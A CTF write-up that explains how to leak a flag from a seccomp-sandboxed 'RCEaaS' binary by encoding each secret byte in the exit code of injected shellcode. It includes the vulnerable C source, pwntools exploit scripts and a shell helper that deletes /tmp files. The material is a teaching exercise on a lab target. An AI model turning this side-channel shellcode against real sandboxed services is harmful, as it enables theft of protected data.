---
title: Exploiting Seccomp-Restricted Program to Leak a Flag
author: megachar0x01
date: 2023-06-09
categories: [Pwn, amd64, ctf]
---

### Purpose : Get The Flag


**Introduction:** The purpose of this write-up is to explain the process of exploiting a seccomp-restricted program to leak a secret. Seccomp is a mechanism in Linux that restricts the system calls a program can make, providing an additional layer of security. The code provided demonstrates the use of seccomp to restrict the program to only two syscalls: `read` and `exit_group`. By leveraging these restrictions and reading one byte at a time, we can gradually leak the secret stored in the program's memory.

**Exploit Strategy:** To exploit the vulnerability, we need to leak the secret byte by byte. Since the program restricts the syscalls to `read` and `exit_group`, we cannot directly leak the secret using the `printf` function or other standard output methods. Instead, we can use the `exit_group` syscall to read the secret directly from memory. By continuously invoking the `exit_group` syscall with a  secret variable  pointer as first argument which  leaked one byte  with exit code that consists of byte in numeric form on every prgram exit , we can gradually leak the secret on .

<img src="https://i.imgur.com/ecAztLc.png" alt="img_1">

<img src="https://i.imgur.com/IEJkw96.png" alt="img_1">

## Vuln Code
```c

#define _DEFAULT_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/fcntl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <string.h>

#define CHECK(B) do { if(!(B)) exit(1); } while(0)

char secret[0x100];
int init_seccomp();

void init() {
    int fd;
    // setting stdout and stdin to be unbuffered
    setvbuf(stdout,0,_IONBF,0);
    setvbuf(stdin,0,_IONBF,0);
    // load the secret
    fd = open("secret.txt", O_RDONLY);
    read(fd, &secret, sizeof(secret));
    close(fd);
}

int main()
{
    char *code;

    init();

    printf("Welcome to \033[1;32mRCEaaS\033[0m\n");
    
    code = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
    read(0, code, 0x1000);

    if (strcmp(secret, code)) {
        CHECK(!fclose(stdout));
        CHECK(!fclose(stderr));
        CHECK(!init_seccomp());
    } else
        printf("You seem trustworthy!\n");


    ((void (*)(void)) code) ();
}

int init_seccomp()
{
#define ALLOW(NR) \
    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, (NR), 0, 1), \
    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW) \

    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD + BPF_W + BPF_ABS, offsetof(struct seccomp_data, arch)),
        BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, AUDIT_ARCH_X86_64, 1, 0),
        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),

        BPF_STMT(BPF_LD + BPF_W + BPF_ABS, offsetof(struct seccomp_data, nr)),
        ALLOW(SYS_read),
        ALLOW(SYS_exit_group),

        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
    };
#undef ALLOW

    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(*filter),
        .filter = filter,
    };

    return prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) || prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}


```


## Exploit

##### First Exploit.py

```python
#!/usr/bin/python3
from pwn import *
import struct

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
break *main

break *main+159
continue
'''.format(**locals())

exe = './vuln'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)

secret = 0x404060



for i in range(256):
	
	try:
		io = start()

		payload = asm(f"""nop
		mov rsi , {secret+i}
		mov rdi, [rsi]
		mov rax,231 /* read syscall number */
		syscall


		""")



		io.sendlineafter(b'Welcome to \033[1;32mRCEaaS\033[0m\n', payload)
		io.recvline()
		print(success())

	except EOFError:
		pass

print(Progress.success())



```

##### Second Exploit.py

```python
#!/usr/bin/python3
from pwn import *

temp_code = [0] * 256
temp_pid= [0] * 256

with open('/tmp/code.txt') as code:
	with open('/tmp/pid_sort.txt') as pid:

		for i in range (256):
			temp_code[i] = code.readline().strip("\n")
			temp_pid[i] = pid.readline().strip("\n")		
		for i in range(256):
			for j in range(256):
				if temp_code[j].split("(pid ")[1].strip(")\n") == temp_pid[i]:
					chr_int = temp_code[j].replace("[*] Process './vuln' stopped with exit code ","").split(" ")[0]
					print(chr(int(chr_int)),end="")

		print("\n")

```

##### Third Exploit.sh

```shell
#!/bin/bash
python3 first.py | tee /tmp/exit_code.txt
cat /tmp/exit_code.txt  |grep "stopped with exit code"  | tee /tmp/code.txt 
cat /tmp/exit_code.txt | grep "exit"  |cut -d "(" -f 2 | sort | cut -d " " -f 2   | cut -d ")" -f 1 | tee /tmp/pid_sort.txt
#clear
echo "Content of Secret.txt"
python3 second.py
rm /tmp/*.txt

```

After Writing this i was known that exit code can be recoded directly Thank @zeeshan.

```python

from pwn import *
context.arch = "amd64"

def gen(i, flag):
    payload = asm(f"""
    mov rsp, {flag+i}
    xor rdi, rdi
    mov dil, byte ptr [rsp]
    {shellcraft.exit_group("rdi")}
    """)
    return payload

char = ""
exit_code = 0

flag = 0x404060

for i in range(30):
    io = process(["./vuln"], close_fds=False)

    payload = gen(i, flag)
    io.sendlineafter(b'Welcome to \033[1;32mRCEaaS\033[0m\n', payload)
    

    exit_code = io.poll(True)
    if exit_code < 20:
        log.info(f"non ascii encountered, exiting...")
        exit(0)
    char += bytes.fromhex(hex(exit_code)[2:]).decode('ASCII')
    info(f"flag is {char}")

    io.close()





```


